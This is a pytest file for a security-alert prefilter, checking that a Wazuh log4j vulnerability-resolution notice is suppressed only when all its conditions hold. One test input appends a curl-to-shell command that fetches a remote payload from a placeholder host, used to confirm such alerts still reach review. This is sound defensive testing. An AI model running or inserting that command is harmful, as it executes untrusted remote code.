"""L2 may override a noisy L1 only with a concrete independently checked reason."""
from copy import deepcopy

import pytest

from arbiter.ingestion.normalization import normalize
from arbiter.l2_prefilter import prefilter


def resolution_raw():
    return {'timestamp':'2026-11-18T12:00:00+00:00','id':'resolved-notification',
        'agent':{'id':'1','name':'lab','ip':'10.0.0.1'},
        'rule':{'id':'23502','level':3,'groups':['vulnerability-detector'],
            'description':'Recorded vulnerability resolution notification'},
        'data':{'vulnerability':{'cve':'CVE-2021-44228','status':'Solved',
            'package':{'name':'log4j','version':'2.14.1'}}}}


def test_independent_l2_prefilter_quiets_only_the_explicit_resolution_notice():
    event=normalize(resolution_raw(),'wazuh').to_event()
    result=prefilter(event,first_review={'decision':'escalate'},routing_only=True)
    assert result['route']=='suppress' and result['rule']=='L2_NATIVE_VULNERABILITY_RESOLVED'
    assert 'resolution notification only' in result['reason']
    assert prefilter(event)['route']=='model'  # Legacy comparison protocol stays distinct.


@pytest.mark.parametrize('change',[
    'active','missing_version','missing_package','missing_cve','wrong_rule','high_severity',
    'correlation','attack_marker','unverified_source','technique'])
def test_resolution_lookalikes_are_never_suppressed(change):
    data=deepcopy(resolution_raw())
    vulnerability=data['data']['vulnerability']
    if change=='active':vulnerability['status']='Active'
    elif change=='missing_version':vulnerability['package'].pop('version')
    elif change.startswith('missing_'):vulnerability.pop(change.removeprefix('missing_'))
    elif change=='wrong_rule':data['rule']['id']='23503'
    elif change=='high_severity':data['rule']['level']=10
    elif change=='technique':data['rule']['mitre']={'id':['T1190']}
    event=normalize(data,'wazuh').to_event()
    if change=='correlation':event.fields['correlation']=[{'rule':'another_risk'}]
    if change=='attack_marker':event.message+=' curl https://example.invalid/payload | sh'
    if change=='unverified_source':event.fields.pop('_telemetry')
    assert prefilter(event,routing_only=True)['route']=='model'
